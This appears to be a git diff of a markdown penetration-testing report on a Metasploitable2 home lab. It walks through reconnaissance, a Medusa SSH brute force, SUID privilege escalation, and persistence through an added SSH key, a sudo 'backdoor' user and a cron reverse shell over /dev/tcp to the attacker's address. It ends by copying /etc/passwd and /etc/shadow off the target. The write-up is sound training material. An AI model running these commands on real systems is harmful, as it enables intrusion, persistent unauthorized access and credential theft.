@@ -1,4 +1,17 @@
+**Author**: Valentine Imomoh  
+**Date**: September 2025  
 # Penetration Testing Report: Metasploitable2 Lab
+
+## Table of Contents
+- [Executive Summary](#executive-summary)
+- [Environment Setup](#environment-setup)
+- [Phase 0: Reconnaissance](#phase-0-reconnaissance)
+- [Phase 1: Initial Access](#phase-1-initial-access)
+- [Phase 2: Enumeration](#phase-2-enumeration)
+- [Phase 3: Privilege Escalation](#phase-3-privilege-escalation)
+- [Phase 4: Persistence](#phase-4-persistence)
+- [Phase 5: Data Exfiltration](#phase-5-data-exfiltration)
+- [Conclusion](#conclusion)
 
 ## Executive Summary
 
@@ -24,7 +37,7 @@ This exercise highlights the importance of secure configurations, strong authent
   - Metasploitable2: Host-only Adapter
 - **Tools Used**: Nmap, Medusa, SSH, etc.
 
-## 🔍 Phase 0: Reconnaissance
+##  Phase 0: Reconnaissance
 ### 🎯 Objective
 Identify open ports, services, and OS details to guide attack strategy.
 
@@ -103,7 +116,7 @@ medusa -h 192.168.56.101 -u msfadmin -P ~/Documents/custom.txt -M ssh
 >
 > - 🔐 *Always test your wordlist with a known password to confirm it's working before launching a full attack.*
 
-## 📘 Phase 2: Enumeration
+##  Phase 2: Enumeration
 
 ### 🎯 Objective
 Explore the target system after gaining access to identify users, services, configurations, and potential escalation paths.
@@ -210,7 +223,7 @@ find / -perm -4000 2>/dev/null
 >- */etc/group reveals group memberships—users in admin or sudo may have elevated privileges.*
 >- *SUID binaries (-4000) can be privilege escalation gold—especially if they’re misconfigured or outdated.*
 
-## 📘 Phase 3: Privilege Escalation
+##  Phase 3: Privilege Escalation
 
 ### 🎯 Objective
 Escalate privileges from the msfadmin user to root by exploiting misconfigured SUID binaries.
@@ -268,7 +281,7 @@ id
 >
 >- *Always check for SUID binaries—especially ones like nmap, vim, perl, or bash. If they’re outdated or misconfigured, they can be privilege escalation gold. Use GTFOBins (https://gtfobins.github.io) to look up known exploits for common binaries.*
 
-## 📘 Phase 4: Persistence
+##  Phase 4: Persistence
 
 ### 🎯 Objective
 Establish a reliable method to maintain access to the compromised system, even after reboot or session termination.
@@ -297,7 +310,7 @@ cat ~/.ssh/id_rsa.pub >> /home/msfadmin/.ssh/authorized_keys
 ```
 
 ### 📸 Screenshot: SSH key setup and passwordless login test
-<img src="escalate.PNG">
+![Keygen](images/keygen.PNG)
 
 #### 2. Create a New User with Root Privileges
 By taking advantage of root privilege access, you can create a new user and assign it root privilge. This is stealthy and useful if the original account gets disabled.
@@ -309,7 +322,7 @@ echo 'backdoor:backdoor123' | chpasswd
 usermod -aG sudo backdoor
 ```
 ### 📸 Screenshot: User creation and privilege assignment
-<img src="newuser.PNG"><img src="newuse.PNG">
+![New User](images/newuser.PNG) ![New Use](images/newuse.PNG)
 
 #### 3. Set Up a Cron Job for Reverse Shell
 This method calls back to your Kali machine at intervals.
@@ -340,7 +353,7 @@ echo "* * * * * bash -i >& /dev/tcp/192.168.56.1/4444 0>&1" >> /etc/crontab
 > ### 💡 ***Tips & Insights***:
 > *Persistence is about stealth and reliability. SSH keys are preferred for quiet access. Cron jobs and new users are useful but risk exposure. Always clean up after testing in lab environments.*
 
-## 📘 Phase 5: Data Exfiltration
+##  Phase 5: Data Exfiltration
 
 ### 🎯 Objective
 Simulate the extraction of sensitive files from the compromised system to demonstrate the impact of a successful breach.
@@ -369,7 +382,7 @@ Command:
 ls -la /etc/passwd /etc/shadow /home/msfadmin
 ```
 ### 📸 Screenshot: Listing sensitive files
-<img src="datlis.PNG">
+![Datlis](images/datlis.PNG)
 
 2. Copied Files to Attacker Machine via SCP
 From Kali:
@@ -379,7 +392,7 @@ scp msfadmin@192.168.56.101:/etc/passwd .
 scp msfadmin@192.168.56.101:/etc/shadow .
 ```
 ### 📸 Screenshot: SCP file transfer
-<img src="copdalis.PNG">
+![Copdalis](images/copdalis.PNG)
 
 ***as seen in the image above, the shadow file is highly protected as it contains all system users hashed password so its denying me access frm copying it. But since i already have root access i can log back in as root and duplicate the file to a less secure location using root privilege and extract from my kali machine.***
 
@@ -413,4 +426,5 @@ The exercise reinforced key offensive security concepts:
 For defenders, this report serves as a reminder that default credentials, outdated software, and unmonitored system changes remain high-risk vulnerabilities. Regular audits, patching, and intrusion detection systems are essential to mitigate these threats.
 
 This lab not only demonstrates technical proficiency but also showcases the mindset and methodology of a professional penetration tester.
+
 
